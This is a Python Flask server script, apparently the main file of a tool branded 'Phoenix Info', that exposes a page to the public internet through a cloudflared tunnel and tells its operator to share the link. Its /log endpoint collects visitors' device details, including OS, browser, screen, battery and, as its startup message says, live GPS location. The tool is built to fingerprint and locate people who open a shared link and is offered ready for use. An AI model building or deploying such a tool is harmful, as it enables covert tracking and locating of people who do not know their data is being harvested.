#!/usr/bin/env python3
import sys
import time
import threading
from flask import Flask, request, render_template_string
from flask_cors import CORS
import importlib.util
import os
import subprocess
import socket

# ========== LOAD MODULES WITHOUT .py ==========
def load_module(filepath):
    try:
        with open(filepath, 'r') as f:
            code = f.read()
        module_name = os.path.basename(filepath)
        spec = importlib.util.spec_from_loader(module_name, loader=None)
        module = importlib.util.module_from_spec(spec)
        exec(code, module.__dict__)
        return module
    except Exception as e:
        print(f"❌ Error loading {filepath}: {e}")
        sys.exit(1)

# Load all modules
templates_mod = load_module('templates')
device_info_mod = load_module('device_info')
tunnel_mod = load_module('tunnel')
config_mod = load_module('config')
utils_mod = load_module('utils')
logger_mod = load_module('logger')
routes_mod = load_module('routes')

HTML_PAGE = templates_mod.HTML_PAGE
print_exact = device_info_mod.print_exact
SERVER_MODEL = device_info_mod.SERVER_MODEL
start_cloudflared = tunnel_mod.start_cloudflared
find_free_port = tunnel_mod.find_free_port
CONFIG = config_mod.CONFIG
get_timestamp = utils_mod.get_timestamp
log_message = logger_mod.log_message
health_check = routes_mod.health_check

app = Flask(__name__)
CORS(app)

@app.route('/')
def index():
    log_message("Page loaded", "INFO")
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json()
        if data:
            log_message("Device data received", "INFO")
            print_exact(data)
        return "ok", 200
    except Exception as e:
        log_message(f"Error in log: {e}", "ERROR")
        return "error", 500

@app.route('/health', methods=['GET'])
def health():
    return health_check()

@app.route('/tunnel-status', methods=['GET'])
def tunnel_status():
    """Check tunnel status"""
    try:
        # Check if cloudflared is running
        result = subprocess.run(["pgrep", "-f", "cloudflared"], capture_output=True)
        if result.stdout:
            return {"status": "running", "pid": result.stdout.decode().strip()}
        else:
            return {"status": "not running"}, 404
    except:
        return {"status": "unknown"}, 500

if __name__ == '__main__':
    print("""
\033[1;31m██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗\033[0m  \033[1;34m██╗███╗   ██╗███████╗ ██████╗ \033[0m
\033[1;33m██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝\033[0m  \033[1;35m██║████╗  ██║██╔════╝██╔═══██╗\033[0m
\033[1;32m██████╔╝███████║██║   ██║██╔██╗ ██║█████╗  \033[0m  \033[1;36m██║██╔██╗ ██║█████╗  ██║   ██║\033[0m
\033[1;33m██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝  \033[0m  \033[1;34m██║██║╚██╗██║██╔══╝  ██║   ██║\033[0m
\033[1;31m██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗\033[0m  \033[1;35m██║██║ ╚████║██║     ╚██████╔╝\033[0m
\033[1;32m╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝\033[0m  \033[1;36m╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ \033[0m

\033[1;33m
🔴 YouTube: https://www.youtube.com/@aryanafridi00
💻 Developer: Aryan Afridi 
📡 GitHub: https://github.com/shahid2005a
\033[0m
""")
    
    try:
        log_message("Starting Phoenix Server", "INFO")
        log_message(f"Host Device Model: {SERVER_MODEL}", "INFO")
        
        port = find_free_port(CONFIG['start_port'])
        log_message(f"Using port: {port}", "INFO")
        print(f"\n📡 Local URL: http://localhost:{port}")
        
        # Start tunnel and get URL
        url, proc = start_cloudflared(port)
        
        if url:
            log_message(f"Public URL: {url}", "INFO")
            print(f"\n🌐 PUBLIC URL: {url}")
            print(f"📋 Share this URL with others: {url}")
            print(f"🔄 Tunnel will stay active until server stops")
        else:
            log_message("Cloudflared tunnel not started", "WARNING")
            print("\n⚠️ Cloudflared tunnel not started automatically.")
            print("📌 You can still access locally at: http://localhost:" + str(port))
            print("📌 Or use ngrok manually: ngrok http " + str(port))
        
        # Save URL to file
        if url:
            with open("tunnel_url.txt", "w") as f:
                f.write(url)
        
        print("\n✅ Enhanced device details: OS, Browser, Device Type, Screen Resolution, Battery")
        print("✅ GPS live location captured if user allows")
        print("✅ Model detection improved for ALL devices")
        print("✅ Health check: /health")
        print("✅ Tunnel status: /tunnel-status")
        print("\n🚀 Flask server running... Press Ctrl+C to stop.\n")
        
        app.run(host='0.0.0.0', port=port, debug=False)
        
    except KeyboardInterrupt:
        log_message("Server stopped by user", "INFO")
        print("\n\n\033[1;33m👋 Server stopped by user\033[0m")
        sys.exit(0)
    except Exception as e:
        log_message(f"Error: {e}", "ERROR")
        print(f"\n\033[1;31m❌ Error: {e}\033[0m")
        sys.exit(1)